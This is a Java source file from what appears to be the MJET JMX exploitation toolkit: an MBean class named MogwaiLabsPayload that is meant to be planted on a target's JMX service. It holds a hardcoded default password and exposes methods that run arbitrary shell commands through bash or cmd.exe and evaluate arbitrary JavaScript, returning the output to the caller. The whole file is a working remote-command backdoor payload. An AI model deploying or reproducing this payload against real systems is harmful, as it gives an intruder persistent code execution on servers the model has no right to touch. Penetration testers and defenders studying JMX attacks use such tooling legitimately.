package de.mogwailabs.MogwaiLabsMJET;

import javax.script.ScriptEngineManager;
import java.io.InputStreamReader;
import java.io.StringWriter;

import javax.script.ScriptEngine;

public class MogwaiLabsPayload implements MogwaiLabsPayloadMBean {
	
	private String password;

	
	public MogwaiLabsPayload() {
		password = "I+n33d+a+glass+0f+watta";
	}
	
	@Override
	public String runCMD(String passwd, String cmd) {

		
		if (passwd.equals(this.password) == false)  {
			return "ERROR: Wrong password";
		}
		
		try {
			
			
			String[] full_cmd;

			if(System.getProperty("line.separator").equals("\n"))
				full_cmd = new String[]{"bash","-c",cmd};
			else // Assumes win
				full_cmd = new String[]{"cmd.exe","/c",cmd};

			java.lang.Runtime runtime = java.lang.Runtime.getRuntime();
			java.lang.Process p = runtime.exec(full_cmd);

			p.waitFor();

			java.io.InputStream is = p.getInputStream();
			java.io.BufferedReader reader = new java.io.BufferedReader(new InputStreamReader(is));
      
			java.lang.StringBuilder builder = new StringBuilder();
			String line = null;
			while ( (line = reader.readLine()) != null) {
			   builder.append(line);
			   builder.append(System.getProperty("line.separator"));
			}
			String result = builder.toString();
			
			is.close();
			
			return result;

		} catch(Exception ex) {
			return ex.getMessage();
		}
	}

	@Override
	public String runJS(String passwd, String js) {
		
		if (passwd.equals(this.password)) {
			try {
				StringWriter output =new StringWriter();
				
				ScriptEngineManager factory = new ScriptEngineManager();
				ScriptEngine engine = factory.getEngineByName("JavaScript");
				engine.getContext().setWriter(output);
				engine.eval(js);
				return output.toString();
			} catch(Exception ex) {
				return ex.getMessage();
			}
			
		}
		else {
			return "ERROR: Wrong password";
		}
		
		
		
	}


	@Override
	public boolean changePassword(String oldPass, String newPass) {
		
		if (oldPass.equals(this.password)) {
			this.password = newPass;
			return true;
		}
		return false;
	}

}

